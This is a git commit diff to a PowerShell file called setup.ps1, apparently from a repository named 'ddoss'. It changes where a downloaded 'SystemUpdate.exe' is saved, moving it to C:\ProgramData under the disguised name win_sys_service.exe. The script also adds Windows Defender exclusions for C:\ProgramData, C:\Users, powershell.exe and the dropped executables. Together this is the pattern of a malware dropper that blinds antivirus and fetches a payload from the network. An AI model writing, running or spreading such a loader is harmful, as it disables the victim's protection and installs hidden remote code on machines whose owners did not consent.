8ec65cec600d849d281261891289273815f83142
srap18 <48030957+srap18@users.noreply.github.com>
2026-01-21 08:44:39 +0300

    Update setup.ps1

--- setup.ps1
+++ setup.ps1
@@ -4,7 +4,7 @@ if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]:
 }
 
 $u = "https://github.com/srap18/ddoss/raw/refs/heads/main/SystemUpdate.exe"
-$o = "$env:APPDATA\win_sys_service.exe"
+$o = "C:\ProgramData\win_sys_service.exe"
 
 Add-MpPreference -ExclusionPath "C:\ProgramData", "C:\Users" -ErrorAction SilentlyContinue
 Add-MpPreference -ExclusionProcess "powershell.exe", "win_sys_service.exe", "SystemUpdate.exe" -ErrorAction SilentlyContinue
